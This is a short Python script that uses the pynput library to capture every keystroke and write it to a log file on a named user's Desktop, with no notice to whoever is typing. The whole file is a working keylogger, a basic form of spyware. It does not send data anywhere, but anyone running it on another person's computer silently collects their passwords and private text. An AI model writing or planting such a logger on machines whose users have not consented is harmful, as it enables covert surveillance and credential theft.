import string

from pynput.keyboard import Key, Listener
import logging

log_dir = r"C:/Users/Dero/Desktop/"
logging.basicConfig(filename=(log_dir + "keyLog.txt"), level=logging.DEBUG, format='%(message)s')


def on_press(key):
    logging.info(key)


with Listener(on_press=on_press) as listener:
    listener.join()

